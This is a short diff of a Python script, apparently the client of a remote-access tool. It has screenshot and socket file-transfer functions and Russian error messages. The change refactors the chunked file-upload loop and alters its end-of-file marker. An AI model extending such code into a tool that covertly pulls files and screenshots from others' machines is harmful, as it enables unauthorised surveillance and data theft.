@@ -108,18 +108,13 @@ def screenshot(sock):
 def upload(sock, file_name):
     try:
         with open(file_name, "rb") as file:
-            while True:
-                chunk = file.read(1024)  
-                if not chunk:  
-                    break
-                sock.sendall(chunk) 
-        sock.sendall(b"EOF")  
+            while chunk := file.read(1024):  
+                sock.sendall(chunk)  
+        sock.sendall(b"EOFEOFEOF")  
     except FileNotFoundError:
         reliable_send("[!!] Файл не найден", sock)
     except Exception as e:
         reliable_send(f"[!!] Ошибка: {e}", sock)
-
-
 
 
 def save_file(sock, file_name):
